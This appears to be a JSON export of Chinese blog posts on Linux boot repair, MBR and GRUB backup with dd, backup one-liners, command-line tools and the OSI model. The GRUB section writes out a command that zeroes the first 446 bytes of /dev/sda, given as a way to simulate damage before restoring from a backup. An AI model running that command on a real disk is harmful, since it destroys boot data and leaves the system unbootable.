7采用的是GRUB2启动引导器）●加载Linux内核：把内核和镜像文件系统加载到内存中。Linux内核是一个预先编译好的特殊二进制文件，介于各自硬件资源与系统程序之间，复制资源分配与调度，内核接过系统控制权以后，将完全掌控整个Linux操作系统的运行过程。（CentOS 7系统中，默认的内核文件位于“&#x2F;boot&#x2F;vmlinuz-3.10.0-514.e17.x86_64”）●init 进程初始化：加载硬件驱动程序，内核把init进程加载到内存中运行。为了完成进一步的系统引导过程，Linux内核首先将系统中的“&#x2F;sbin&#x2F;init”程序加载到内存中运行（运行中的程序称为进程），init进程（systemd）负责完成整个系统的初始化，最后等待用户进行登录。 2&gt; 为避免因引导扇区的损坏或丢失导致系统无法启动，需提前备份MBR扇区信息 MBR位于第一块硬盘的第一个物理扇区处，总共512字节；故我们可使用dd命令将MBR所在硬盘的第一个512字节的块保存即可，假设MBR在sda（第一块硬盘上），创建的备份目录为sdb上的&#x2F;mbrbak&#x2F;,执行命令： 可执行以下命令模式损坏MBR块区： 恢复时，重启系统，使用救援模式，用dd命令将MBR备份写回系统MBR第一个扇区即可： 3&gt;Grub引到程序异常导致的系统启动失败 比如：MBR中的GRUB引导程序（1-446字节）遭到破坏；或grub.cfg文件丢失，引导配置有误，文件位置&#x2F;boot&#x2F;grub2&#x2F;grup.cfg。 故障现象：系统引导卡死到grub &gt;提示符，无法继续进入 解决思路： 1.尝试手动输入引导命令修复（不推荐） grub&gt; insmod xfsgrub&gt; linux16 &#x2F;vmlinuz-0-rescue-73d7ede256a74b0e975e69f22d862090 root&#x3D;UUID&#x3D;d069b243-6623-4983-8d61-3ec6956a4f2b ro rhgb quietgrub&gt; initrd16 &#x2F;initramfs-0-rescue-73d7ede256a74b0e975e69f22d862090.imggrub&gt; boot12342.进入急救模式，重写或者从备份中恢复grub.cfg 然后挂载系统CD盘，从CD盘恢复GRUB数据。 3.急救模式向MBR扇区中重建grub程序MBR位于第一块硬盘( &#x2F;dev&#x2F;sda)的第一个物理扇区处，总共512字节， 前446字节是主引导记录，分区表保存在MBR扇区中的第447-510字节中。修复方法跟MBR基本一致，只是备份的数据只需要446字节就可以，将bs&#x3D;512修改为bs&#x3D;446即可。过程如下： a、创建新目录用以挂载备份磁盘，备份GRUB引导程序#mkdir &#x2F;bak#mount &#x2F;dev&#x2F;sdb1 &#x2F;bak&#x2F;#dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;bak&#x2F;grup.bak bs&#x3D;446 count&#x3D;1 b、模拟对MBR中的GRUB引导程序的破坏，但不破坏分区表#dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;dev&#x2F;sda bs&#x3D;446 count&#x3D;1 c、引导界面进入急救模式，从备份文件中恢复GRUB引导程序sh-4.2# mkdir &#x2F;backupdirsh-4.2# mount &#x2F;dev&#x2F;sdb1 &#x2F;backupdirsh-4.2# dd if&#x3D;backupdir&#x2F;grup.bak of&#x3D;&#x2F;dev&#x2F;sda bs&#x3D;446 count&#x3D;1sh-4.2# exit 附录：系统启动时服务自启动管理工具ntsysv ntsysv命令提供了一个基于文本界面的菜单操作方式，集中管理系统不同的运行等级下的系统服务启动状态。在RedHat各个发行版，CentOS各个版本，都自带这个工具。它具有互动式操作界面，您可以轻易地利用方向键和空格键等，开启，关闭操作系统在每个执行等级中，所要执行的系统服务。 输入ntsysv命令后，出现一个交互式的管理菜单，如下： 备份dump -0aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home 制作一个 ‘&#x2F;home’ 目录的完整备份dump -1aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home 制作一个 ‘&#x2F;home’ 目录的交互式备份restore -if &#x2F;tmp&#x2F;home0.bak 还原一个交互式备份rsync -rogpav –delete &#x2F;home &#x2F;tmp 同步两边的目录rsync -rogpav -e ssh –delete &#x2F;home ip_address:&#x2F;tmp 通过SSH通道rsyncrsync -az -e ssh –delete ip_addr:&#x2F;home&#x2F;public &#x2F;home&#x2F;local 通过ssh和压缩将一个远程目录同步到本地目录rsync -az -e ssh –delete &#x2F;home&#x2F;local ip_addr:&#x2F;home&#x2F;public 通过ssh和压缩将本地目录同步到远程目录dd bs&#x3D;1M if&#x3D;&#x2F;dev&#x2F;hda | gzip | ssh user@ip_addr ‘dd of&#x3D;hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;tmp&#x2F;file1 备份磁盘内容到一个文件tar -Puf backup.tar &#x2F;home&#x2F;user 执行一次对 ‘&#x2F;home&#x2F;user’ 目录的交互式备份操作( cd &#x2F;tmp&#x2F;local&#x2F; &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd &#x2F;home&#x2F;share&#x2F; &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容( tar c &#x2F;home ) | ssh -C user@ip_addr ‘cd &#x2F;home&#x2F;backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录tar cf - . | (cd &#x2F;tmp&#x2F;backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接find &#x2F;home&#x2F;user1 -name ‘.txt’ | xargs cp -av –target-directory&#x3D;&#x2F;home&#x2F;backup&#x2F; –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录find &#x2F;var&#x2F;log -name ‘.log’ | tar cv –files-from&#x3D;- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包dd if&#x3D;&#x2F;dev&#x2F;hda of&#x3D;&#x2F;dev&#x2F;fd0 bs&#x3D;512 count&#x3D;1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作dd if&#x3D;&#x2F;dev&#x2F;fd0 of&#x3D;&#x2F;dev&#x2F;hda bs&#x3D;512 count&#x3D;1 从已经保存到软盘的备份中恢复MBR内容 15、Linux运维工具及技巧1）15 个超赞的 Linux 工具A、比grep、ack更快的递归搜索文件内容工具ag ： B、tig 命令：字符模式下交互查看git项目，可以替代git命令。 C、mycli ：mysql客户端，支持语法高亮和命令补全，效果类似ipython，可以替代mysql命令。 D、jq : json文件处理以及格式化显示，支持高亮，可以替换python -m json.tool。 E、shellcheck ： shell脚本静态检查工具，能够识别语法错误以及不规范的写法。 F、、fzf ：命令行下模糊搜索工具，能够交互式智能搜索并选取文件或者内容，配合终端ctrl-r历史命令搜索简直完美。 G、PathPicker(fpp) : 在命令行输出中自动识别目录和文件，支持交互式，配合git非常有用。eg1：git diff HEAD~8 –stat | fpp H、htop : 提供更美观、更方便的进程监控工具，替代top命令。而glances ：更强大的 htop &#x2F; top 代替者。 下图为glances的： I、axel ： 多线程下载工具，下载文件时可以替代curl、wget。eg：axel -n 20 http://centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso J、sz&#x2F;rz ： 交互式文件传输，在多重跳板机下传输文件非常好用，不用一级一级传输。K、cloc ：代码统计工具，能够统计代码的空行数、注释行、编程语言。 L、tmux ：终端复用工具，替代screen、nohup。 M、script&#x2F;scriptreplay : 终端会话录制。eg1：录制script -t 2&gt;time.txt session.typescript 执行后开始录制，下面你执行的所有操作都可被记录#your commands#录制结束exit#回放：scriptreplay -t time.txt session.typescript N、multitail ：多重 tail。通常你不止一个日志文件要监控，怎么办？ 终端软件里开多个 tab 太占地方，可以试试这个工具：","categories":[],"tags":[]},{"title":"iso七层模型","slug":"iso七层模型","date":"2022-11-08T16:01:03.000Z","updated":"2023-12-02T12:27:31.800Z","comments":true,"path":"2022/11/09/iso七层模型/","link":"","permalink":"http://example.com/2022/11/09/iso%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/","excerpt":"一、是什么OSI （Open System Interconnect）模型全称为开放式通信系统互连参考模型，是国际标准化组织 ( ISO ) 提出的一个试图使各种计算机在世界范围内互连为网络的标准框架 OSI将计算机网络体系结构划分为七层，每一层实现各自的功能和协议，并完成与相邻层的接口通信。即每一层扮演固定的角色，互不打扰","text":"一、是什么OSI （Open System Interconnect）模型全称为开放式通信系统互连参考模型，是国际标准化组织 ( ISO ) 提出的一个试图使各种计算机在世界范围内互连为网络的标准框架 OSI将计算机网络体系结构划分为七层，每一层实现各自的功能和协议，并完成与相邻层的接口通信。即每一层扮演固定的角色，互不打扰 二、划分OSI主要划分了七层，如下图所示： 应用层应用层位于 OSI 参考模型的第七层，其作用是通过应用程序间的交互来完成特定的网络应用 该层协议定义了应用进程之间的交互规则，通过不同的应用层协议为不同的网络应用提供服务。例如域名系统 DNS，支持万维网应用的 HTTP 协议，电子邮件系统采用的 SMTP协议等 在应用层交互的数据单元我们称之为报文 表示层表示层的作用是使通信的应用程序能够解释交换数据的含义，其位于 OSI参考模型的第六层，向上为应用层提供服务，向下接收来自会话层的服务 该层提供的服务主要包括数据压缩，数据加密以及数据描述，使应用程序不必担心在各台计算机中表示和存储的内部格式差异 会话层会话层就是负责建立、管理和终止表示层实体之间的通信会话 该层提供了数据交换的定界和同步功能，包括了建立检查点和恢复方案的方法 传输层传输层的主要任务是为两台主机进程之间的通信提供服务，处理数据包错误、数据包次序，以及其他一些关键传输问题 传输层向高层屏蔽了下层数据通信的细节。因此，它是计算机通信体系结构中关键的一层 其中，主要的传输层协议是TCP和UDP 网络层两台计算机之间传送数据时其通信链路往往不止一条，所传输的信息甚至可能经过很多通信子网 网络层的主要任务就是选择合适的网间路由和交换节点，确保数据按时成功传送 在发送数据时，网络层把传输层产生的报文或用户数据报封装成分组和包，向下传输到数据链路层 在网络层使用的协议是无连接的网际协议（Internet Protocol）和许多路由协议，因此我们通常把该层简单地称为 IP 层 数据链路层数据链路层通常也叫做链路层，在物理层和网络层之间。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层协议 在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP数据报组装成帧，在两个相邻节点间的链路上传送帧 每一帧的数据可以分成：报头head和数据data两部分: head 标明数据发送者、接受者、数据类型，如 MAC地址data 存储了计算机之间交互的数据通过控制信息我们可以知道一个帧的起止比特位置，此外，也能使接收端检测出所收到的帧有无差错，如果发现差错，数据链路层能够简单的丢弃掉这个帧，以避免继续占用网络资源 物理层作为OSI 参考模型中最低的一层，物理层的作用是实现计算机节点之间比特流的透明传送 该层的主要任务是确定与传输媒体的接口的一些特性（机械特性、电气特性、功能特性，过程特性） 该层主要是和硬件有关，与软件关系不大 三、传输过程数据在各层之间的传输如下图所示： 应用层报文被传送到运输层在最简单的情况下，运输层收取到报文并附上附加信息，该首部将被接收端的运输层使用应用层报文和运输层首部信息一道构成了运输层报文段。附加的信息可能包括：允许接收端运输层向上向适当的应用程序交付报文的信息以及差错检测位信息。该信息让接收端能够判断报文中的比特是否在途中已被改变运输层则向网络层传递该报文段，网络层增加了如源和目的端系统地址等网络层首部信息，生成了网络层数据报网络层数据报接下来被传递给链路层，在数据链路层数据包添加发送端 MAC 地址和接收端 MAC 地址后被封装成数据帧在物理层数据帧被封装成比特流，之后通过传输介质传送到对端对端再一步步解开封装，获取到传送的数据","categories":[],"tags":[]},{"title":"problem","slug":"problem","date":"2020-12-16T18:42:50.000Z","updated":"2023-12-16T19:01:21.378Z","comments":true,"path":"2020/12/17/problem/","link":"","permalink":"http://example.com/2020/12/17/problem/","excerpt":"","text":"2020&#x2F;12&#x2F;16 fuckcdn原理，全网扫描cdn。哪天有时间可以研究一下，全网cdn扫描的源码。fuckcdn的意语言我没学过，找个c的研究，。或者去youtube或谷歌找相关技术文章。国内没有详细的讲解","categories":[],"tags":[]},{"title":"清单","slug":"学习计划","date":"2020-11-11T13:14:40.000Z","updated":"2023-12-24T07:28:07.824Z","comments":true,"path":"2020/11/11/学习计划/","link":"","permalink":"http://example.com/2020/11/11/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/","excerpt":"网络初级运维知识学习 针对linux运维进行学习","text":"网络初级运维知识学习 针对linux运维进行学习 尝试清单：flipper zero esp32 智能手表 下面是未解决问题清单：http://frozenfish0x.github.io/2020/12/17/problem/","categories":[],"tags":[]}],"categories":[],"tags":[]}